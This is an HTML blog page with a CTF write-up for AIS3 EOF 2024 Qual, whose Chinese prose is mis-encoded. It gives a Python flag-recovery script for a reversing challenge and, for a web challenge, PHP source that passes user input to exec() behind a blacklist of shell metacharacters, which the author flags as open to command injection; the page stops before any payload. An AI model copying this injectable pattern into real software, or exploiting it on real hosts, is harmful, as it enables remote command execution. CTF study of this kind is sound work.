<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<!--Description-->



    <meta name="description" content="Author:å ‡å§¬NaupRank : 42

image
MiscWelcomeç°½åˆ° DCå°±æœ‰ï¼Œè¨˜å¾—åŠ DCï¼Œç„¶å¾Œè†œæ‹œItiscaleb
image
reverseFlag Generatoré¡Œç›®æœƒæŠŠé€™å¨Blockå¯«é€²flag.exe(åŸæœ¬çœ‹äº†ä¸€é™£å­ï¼Œä¸æ˜¯å¾ˆç†è§£å¥¹åœ¨å¹¹å˜›wwwï¼Œå¾Œä¾†æˆ‘çªç„¶çœ‹æ‡‚äº†é‚£ä¸€å¨"/>


<!--Author-->

    <meta name="author" content="Naupå ‡å§¬"/>


<!--Open Graph Title-->

    <meta property="og:title" content="AIS3 EOF 2024 Qual Writeup"/>


<!--Open Graph Description-->

    <meta property="og:description" content="Author:å ‡å§¬NaupRank : 42

image
MiscWelcomeç°½åˆ° DCå°±æœ‰ï¼Œè¨˜å¾—åŠ DCï¼Œç„¶å¾Œè†œæ‹œItiscaleb
image
reverseFlag Generatoré¡Œç›®æœƒæŠŠé€™å¨Blockå¯«é€²flag.exe(åŸæœ¬çœ‹äº†ä¸€é™£å­ï¼Œä¸æ˜¯å¾ˆç†è§£å¥¹åœ¨å¹¹å˜›wwwï¼Œå¾Œä¾†æˆ‘çªç„¶çœ‹æ‡‚äº†é‚£ä¸€å¨"/>


<!--Open Graph Site Name-->
    <meta property="og:site_name" content="å ‡å§¬ Naup&#39;s Blog"/>

<!--Type page-->

    <meta property="og:type" content="article"/>


<!--Page Cover-->


    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>


<meta name="twitter:card" content="summary_large_image"/>




    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>


<!-- Title -->

<title>AIS3 EOF 2024 Qual Writeup | å ‡å§¬ Naup&#39;s Blog</title>

<!-- Bootstrap Core CSS -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">

<!-- Custom CSS -->

<link rel="stylesheet" href="/css/main.css">


<!-- Custom Fonts -->
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<!-- Gallery -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">

<!-- favicon -->

<link rel="icon" href="/img/icon.jpg"/>



    <!-- Google Analytics -->
    


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
<!-- Head tag -->

<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
    <div class="container pl-0 pr-0">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <a class="navbar-brand text-white p-1 pl-3" href="/">å ‡å§¬ Naup's Blog</a>
        </div>
        <div class="navbar-nav float-right">
            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
                <i class="fas fa-search"></i>
            </button>
        </div>
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 col-md-12 text-center">
                <div class="post-heading text-white">
                    <h1>AIS3 EOF 2024 Qual Writeup</h1>
                    
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <!-- Post Main Content -->
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
                
                    <span class="meta d-inline-block">
    
    
    <!-- Date -->
    
        <span class="post-meta-split">&nbsp;|&nbsp;</span>
        <i class="far fa-calendar-check fa-fw"></i>
        2024-02-29
    
    <!-- word count and read count -->
    

    

    
</span>  
                
                <blockquote>
<p>Author:å ‡å§¬Naup<br>Rank : 42</p>
</blockquote>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BkK68GOu6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BkK68GOu6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>ç°½åˆ° DCå°±æœ‰ï¼Œè¨˜å¾—åŠ DCï¼Œç„¶å¾Œè†œæ‹œItiscaleb</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bk0pteO_6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bk0pteO_6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Flag-Generator"><a href="#Flag-Generator" class="headerlink" title="Flag Generator"></a>Flag Generator</h2><p>é¡Œç›®æœƒæŠŠé€™å¨Blockå¯«é€²flag.exe(åŸæœ¬çœ‹äº†ä¸€é™£å­ï¼Œä¸æ˜¯å¾ˆç†è§£å¥¹åœ¨å¹¹å˜›wwwï¼Œå¾Œä¾†æˆ‘çªç„¶çœ‹æ‡‚äº†é‚£ä¸€å¨æ±è¥¿æˆ‘æ ¹æœ¬ä¸ç”¨ç†è§£å¥¹åœ¨å¹¹å˜›)<br><div class="img-item" data-src="https://hackmd.io/_uploads/S1kKHl_uT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1kKHl_uT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryvmLx__a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryvmLx__a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>ç›´æ¥ç”¨<code>x64gdb</code>æŠ“åƒæ•¸ï¼Œçœ‹ä»–æŠŠç”šéº¼å¯«é€²å»å°±è¡Œäº†<br>æŠŠå¯«äº†ç”šéº¼æˆªä¸‹ä¾†ï¼Œç„¶å¾ŒåŒ…å›.exeå°±è¡Œäº†<br><div class="img-item" data-src="https://hackmd.io/_uploads/rkM7dxOO6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkM7dxOO6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="stateful"><a href="#stateful" class="headerlink" title="stateful"></a>stateful</h2><p><strong>å¹¸å¥½æˆ‘éƒ½ä½¿ç”¨å·¥äººæ™ºæ…§æŠŠå¼å­æŠ“å‡ºä¾†</strong><br><div class="img-item" data-src="https://hackmd.io/_uploads/r1BtOIFOp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1BtOIFOp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>æœ‰<code>Correct!!!</code>è·Ÿ<code>WRONG!!!</code>ï¼Œç›´æ¥å»state_machine()çœ‹destæ€éº¼ç”¢ç”Ÿã€‚<br>ä½ æœƒçœ‹åˆ°50å€‹stateï¼Œä»–æœƒç¶“éä¸€å †é‹ç®—ä¾†ä¸€å€‹ä¸€å€‹å‘¼å«ï¼Œæ‰€ä»¥è¦å…ˆææ¸…æ¥šä»–åˆ°åº•æ€éº¼å‘¼å«ï¼Œå¯ä»¥å…ˆæŠŠä»–å¯«çš„codeæŠ“ä¸‹ä¾†ï¼Œä¸€ä¸€æ¨™è™Ÿrunä¸€æ¬¡çœ‹é †åºã€‚<br>é †åº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">15</span><br><span class="line">32</span><br><span class="line">45</span><br><span class="line">24</span><br><span class="line">39</span><br><span class="line">27</span><br><span class="line">1</span><br><span class="line">8</span><br><span class="line">12</span><br><span class="line">22</span><br><span class="line">47</span><br><span class="line">23</span><br><span class="line">28</span><br><span class="line">6</span><br><span class="line">37</span><br><span class="line">29</span><br><span class="line">41</span><br><span class="line">18</span><br><span class="line">30</span><br><span class="line">2</span><br><span class="line">48</span><br><span class="line">36</span><br><span class="line">5</span><br><span class="line">16</span><br><span class="line">7</span><br><span class="line">26</span><br><span class="line">9</span><br><span class="line">31</span><br><span class="line">21</span><br><span class="line">3</span><br><span class="line">13</span><br><span class="line">40</span><br><span class="line">43</span><br><span class="line">42</span><br><span class="line">38</span><br><span class="line">25</span><br><span class="line">20</span><br><span class="line">17</span><br><span class="line">10</span><br><span class="line">34</span><br><span class="line">4</span><br><span class="line">44</span><br><span class="line">35</span><br><span class="line">11</span><br><span class="line">50</span><br><span class="line">49</span><br><span class="line">46</span><br><span class="line">19</span><br><span class="line">14</span><br><span class="line">33</span><br></pre></td></tr></table></figure>
<p>æœ€å¾Œå°±æ˜¯å·¥äººæ™ºæ…§äº†ï¼ŒæŠ“ä¸‹ä¾†ï¼Œåéä¾†åšä¸€éï¼Œå°±å¯ä»¥é‚„åŸflagäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">k_target=[</span><br><span class="line">    <span class="number">0x21</span>, <span class="number">0x5A</span>, <span class="number">0xEC</span>, <span class="number">0x33</span>, <span class="number">0x43</span>, <span class="number">0xBC</span>, <span class="number">0x14</span>, <span class="number">0x74</span>, <span class="number">0x1C</span>, <span class="number">0x42</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x5F</span>, <span class="number">0xC4</span>, <span class="number">0x82</span>, <span class="number">0xA1</span>, <span class="number">0x3B</span>, <span class="number">0xEA</span>, <span class="number">0x6D</span>, <span class="number">0xB0</span>, <span class="number">0xFA</span>, <span class="number">0x34</span>, <span class="number">0x6C</span>, <span class="number">0xA0</span>, <span class="number">0x2B</span>, <span class="number">0x72</span>, <span class="number">0x5F</span>, <span class="number">0xF0</span>, <span class="number">0x54</span>, <span class="number">0x40</span>, <span class="number">0x29</span>, <span class="number">0x88</span>, <span class="number">0xA0</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x24</span>, <span class="number">0xE3</span>, <span class="number">0xE0</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x33</span>, <span class="number">0xEC</span>, <span class="number">0x7D</span></span><br><span class="line">]</span><br><span class="line">k_target[<span class="number">5</span>]-=k_target[<span class="number">37</span>]+k_target[<span class="number">20</span>]<span class="comment">#33</span></span><br><span class="line">k_target[<span class="number">8</span>]-=k_target[<span class="number">14</span>]+k_target[<span class="number">16</span>]<span class="comment">#14</span></span><br><span class="line">k_target[<span class="number">17</span>]-=k_target[<span class="number">38</span>]+k_target[<span class="number">24</span>]<span class="comment">#19</span></span><br><span class="line">k_target[<span class="number">15</span>]-=k_target[<span class="number">40</span>]+k_target[<span class="number">8</span>]<span class="comment">#46</span></span><br><span class="line">k_target[<span class="number">37</span>]-=k_target[<span class="number">12</span>]+k_target[<span class="number">16</span>]<span class="comment">#49</span></span><br><span class="line">k_target[<span class="number">4</span>]-=k_target[<span class="number">6</span>]+k_target[<span class="number">22</span>]<span class="comment">#50</span></span><br><span class="line">k_target[<span class="number">10</span>]+=k_target[<span class="number">12</span>]+k_target[<span class="number">22</span>]<span class="comment">#11</span></span><br><span class="line">k_target[<span class="number">18</span>]-=k_target[<span class="number">26</span>]+k_target[<span class="number">31</span>]<span class="comment">#35</span></span><br><span class="line">k_target[<span class="number">23</span>]-=k_target[<span class="number">30</span>]+k_target[<span class="number">39</span>]<span class="comment">#44</span></span><br><span class="line">k_target[<span class="number">4</span>]-=k_target[<span class="number">27</span>]+k_target[<span class="number">25</span>]<span class="comment">#4</span></span><br><span class="line">k_target[<span class="number">37</span>]-=k_target[<span class="number">27</span>]+k_target[<span class="number">18</span>]<span class="comment">#34</span></span><br><span class="line">k_target[<span class="number">41</span>]+=k_target[<span class="number">3</span>]+k_target[<span class="number">34</span>]<span class="comment">#10</span></span><br><span class="line">k_target[<span class="number">13</span>]-=k_target[<span class="number">26</span>]+k_target[<span class="number">8</span>]<span class="comment">#17</span></span><br><span class="line">k_target[<span class="number">2</span>]-=k_target[<span class="number">34</span>]+k_target[<span class="number">25</span>]<span class="comment">#20</span></span><br><span class="line">k_target[<span class="number">0</span>]-=k_target[<span class="number">28</span>]+k_target[<span class="number">31</span>]<span class="comment">#25</span></span><br><span class="line">k_target[<span class="number">4</span>]-=k_target[<span class="number">7</span>]+k_target[<span class="number">25</span>]<span class="comment">#38</span></span><br><span class="line">k_target[<span class="number">18</span>]-=k_target[<span class="number">29</span>]+k_target[<span class="number">15</span>]<span class="comment">#42</span></span><br><span class="line">k_target[<span class="number">21</span>]+=k_target[<span class="number">13</span>]+k_target[<span class="number">42</span>]<span class="comment">#43</span></span><br><span class="line">k_target[<span class="number">21</span>]-=k_target[<span class="number">34</span>]+k_target[<span class="number">15</span>]<span class="comment">#40</span></span><br><span class="line">k_target[<span class="number">7</span>]-=k_target[<span class="number">10</span>]+k_target[<span class="number">0</span>]<span class="comment">#13</span></span><br><span class="line">k_target[<span class="number">13</span>]-=k_target[<span class="number">25</span>]+k_target[<span class="number">28</span>]<span class="comment">#3</span></span><br><span class="line">k_target[<span class="number">32</span>]-=k_target[<span class="number">5</span>]+k_target[<span class="number">25</span>]<span class="comment">#21</span></span><br><span class="line">k_target[<span class="number">31</span>]-=k_target[<span class="number">1</span>]+k_target[<span class="number">16</span>]<span class="comment">#31</span></span><br><span class="line">k_target[<span class="number">1</span>]-=k_target[<span class="number">16</span>]+k_target[<span class="number">40</span>]<span class="comment">#9</span></span><br><span class="line">k_target[<span class="number">30</span>]+=k_target[<span class="number">13</span>]+k_target[<span class="number">2</span>]<span class="comment">#26</span></span><br><span class="line">k_target[<span class="number">1</span>]-=k_target[<span class="number">15</span>]+k_target[<span class="number">6</span>]<span class="comment">#7</span></span><br><span class="line">k_target[<span class="number">7</span>]-=k_target[<span class="number">21</span>]+k_target[<span class="number">0</span>]<span class="comment">#16</span></span><br><span class="line">k_target[<span class="number">24</span>]-=k_target[<span class="number">20</span>]+k_target[<span class="number">5</span>]<span class="comment">#5</span></span><br><span class="line">k_target[<span class="number">36</span>]-=k_target[<span class="number">11</span>]+k_target[<span class="number">15</span>]<span class="comment">#36</span></span><br><span class="line">k_target[<span class="number">0</span>]-=k_target[<span class="number">33</span>]+k_target[<span class="number">16</span>]<span class="comment">#48</span></span><br><span class="line">k_target[<span class="number">19</span>]-=k_target[<span class="number">10</span>]+k_target[<span class="number">16</span>]<span class="comment">#2</span></span><br><span class="line">k_target[<span class="number">1</span>]+=k_target[<span class="number">29</span>]+k_target[<span class="number">13</span>]<span class="comment">#30</span></span><br><span class="line">k_target[<span class="number">30</span>]+=k_target[<span class="number">33</span>]+k_target[<span class="number">8</span>]<span class="comment">#18</span></span><br><span class="line">k_target[<span class="number">15</span>]-=k_target[<span class="number">22</span>]+k_target[<span class="number">10</span>]<span class="comment">#41</span></span><br><span class="line">k_target[<span class="number">20</span>]-=k_target[<span class="number">19</span>]+k_target[<span class="number">24</span>]<span class="comment">#29</span></span><br><span class="line">k_target[<span class="number">27</span>]-=k_target[<span class="number">18</span>]+k_target[<span class="number">20</span>]<span class="comment">#37</span></span><br><span class="line">k_target[<span class="number">39</span>]+=k_target[<span class="number">25</span>]+k_target[<span class="number">38</span>]<span class="comment">#6</span></span><br><span class="line">k_target[<span class="number">23</span>]-=k_target[<span class="number">7</span>]+k_target[<span class="number">34</span>]<span class="comment">#28</span></span><br><span class="line">k_target[<span class="number">37</span>]+=k_target[<span class="number">29</span>]+k_target[<span class="number">3</span>]<span class="comment">#23</span></span><br><span class="line">k_target[<span class="number">5</span>]-=k_target[<span class="number">40</span>]+k_target[<span class="number">4</span>]<span class="comment">#47</span></span><br><span class="line">k_target[<span class="number">17</span>]-=k_target[<span class="number">0</span>]+k_target[<span class="number">7</span>]<span class="comment">#22</span></span><br><span class="line">k_target[<span class="number">9</span>]-=k_target[<span class="number">11</span>]+k_target[<span class="number">3</span>]<span class="comment">#12</span></span><br><span class="line">k_target[<span class="number">31</span>]-=k_target[<span class="number">34</span>]+k_target[<span class="number">16</span>]<span class="comment">#8</span></span><br><span class="line">k_target[<span class="number">16</span>]-=k_target[<span class="number">25</span>]+k_target[<span class="number">11</span>]<span class="comment">#1</span></span><br><span class="line">k_target[<span class="number">14</span>]+=k_target[<span class="number">32</span>]+k_target[<span class="number">6</span>]<span class="comment">#27</span></span><br><span class="line">k_target[<span class="number">6</span>]-=k_target[<span class="number">10</span>]+k_target[<span class="number">41</span>]<span class="comment">#39</span></span><br><span class="line">k_target[<span class="number">2</span>]-=k_target[<span class="number">11</span>]+k_target[<span class="number">8</span>]<span class="comment">#24</span></span><br><span class="line">k_target[<span class="number">0</span>]+=k_target[<span class="number">18</span>]+k_target[<span class="number">31</span>]<span class="comment">#45</span></span><br><span class="line">k_target[<span class="number">9</span>]+=k_target[<span class="number">2</span>]+k_target[<span class="number">22</span>]<span class="comment">#32</span></span><br><span class="line">k_target[<span class="number">14</span>]-=k_target[<span class="number">35</span>]+k_target[<span class="number">8</span>]<span class="comment">#15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k_target:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i%<span class="number">128</span>))</span><br></pre></td></tr></table></figure>
<p>äººå·¥æ™ºæ…§æˆåŠŸé‚„åŸFLAGï¼Œ<del>å»ºè­°é€™é¡Œæ”¹å«äººå·¥æ™ºæ…§&amp;å·¥äººæ™ºæ…§</del><br><div class="img-item" data-src="https://hackmd.io/_uploads/HygHgDYuT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HygHgDYuT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="DNS-Lookup-Tool-Final"><a href="#DNS-Lookup-Tool-Final" class="headerlink" title="DNS Lookup Tool: Final"></a>DNS Lookup Tool: Final</h2><p>é¡Œç›®æºä»£ç¢¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">isset($_GET[<span class="string">&#x27;source&#x27;</span>]) <span class="keyword">and</span> die(show_source(__FILE__, true));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;DNS Lookup Tool | Final&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;section <span class="keyword">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span><br><span class="line">        &lt;div <span class="keyword">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">&quot;column is-6 is-offset-3 has-text-centered&quot;</span>&gt;</span><br><span class="line">                &lt;div <span class="keyword">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span><br><span class="line">                    &lt;h1 <span class="keyword">class</span>=<span class="string">&quot;title&quot;</span>&gt;DNS Lookup Tool ğŸ” | Final Edition&lt;/h1&gt;</span><br><span class="line">                    &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">                        &lt;div <span class="keyword">class</span>=<span class="string">&quot;field&quot;</span>&gt;</span><br><span class="line">                            &lt;div <span class="keyword">class</span>=<span class="string">&quot;control&quot;</span>&gt;</span><br><span class="line">                                &lt;<span class="built_in">input</span> <span class="keyword">class</span>=<span class="string">&quot;input&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> placeholder=<span class="string">&quot;example.com&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;hostname&quot;</span> value=<span class="string">&quot;&lt;?= $_POST[&#x27;name&#x27;] ?? &#x27;&#x27; ?&gt;&quot;</span>&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;button <span class="keyword">class</span>=<span class="string">&quot;button is-block is-info is-fullwidth&quot;</span>&gt;</span><br><span class="line">                            Lookup!</span><br><span class="line">                        &lt;/button&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                    &lt;br&gt;</span><br><span class="line">                    &lt;?php <span class="keyword">if</span> (isset($_POST[<span class="string">&#x27;name&#x27;</span>])) : ?&gt;</span><br><span class="line">                        &lt;section <span class="keyword">class</span>=<span class="string">&quot;has-text-left&quot;</span>&gt;</span><br><span class="line">                            &lt;p&gt;Lookup result:&lt;/p&gt;</span><br><span class="line">                            &lt;b&gt;</span><br><span class="line">                            &lt;?php</span><br><span class="line">                            $blacklist = [<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>];</span><br><span class="line">                            $is_input_safe = true;</span><br><span class="line">                            foreach ($blacklist <span class="keyword">as</span> $bad_word)</span><br><span class="line">                                <span class="keyword">if</span> (strstr($_POST[<span class="string">&#x27;name&#x27;</span>], $bad_word) !== false) $is_input_safe = false;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> ($is_input_safe) &#123;</span><br><span class="line">                                $retcode = <span class="number">0</span>;</span><br><span class="line">                                $output = [];</span><br><span class="line">                                <span class="built_in">exec</span>(<span class="string">&quot;host &#123;$_POST[&#x27;name&#x27;]&#125;&quot;</span>, $output, $retcode);</span><br><span class="line">                                <span class="keyword">if</span> ($retcode === <span class="number">0</span>) &#123;</span><br><span class="line">                                    echo <span class="string">&quot;Host &#123;$_POST[&#x27;name&#x27;]&#125; is valid!\n&quot;</span>;</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    echo <span class="string">&quot;Host &#123;$_POST[&#x27;name&#x27;]&#125; is invalid!\n&quot;</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span> echo <span class="string">&quot;HACKER!!!&quot;</span>;</span><br><span class="line">                            ?&gt;</span><br><span class="line">                            &lt;/b&gt;</span><br><span class="line">                        &lt;/section&gt;</span><br><span class="line">                    &lt;?php endif; ?&gt;</span><br><span class="line">                    &lt;hr&gt;</span><br><span class="line">                    &lt;a href=<span class="string">&quot;/?source&quot;</span>&gt;Source Code&lt;/a&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/section&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>ä»–éæ¿¾æ‰äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;|&#x27;, &#x27;&amp;&#x27;, &#x27;;&#x27;, &#x27;&gt;&#x27;, &#x27;&lt;&#x27;, &quot;\n&quot;, &#x27;flag&#x27;, &#x27;*&#x27;, &#x27;?&#x27;]</span><br></pre></td></tr></table></figure>
<p>è€Œä¸”çœ‹åˆ°é€™å€‹æ¨çŸ¥å¯ä»¥<code>command injection</code></p>
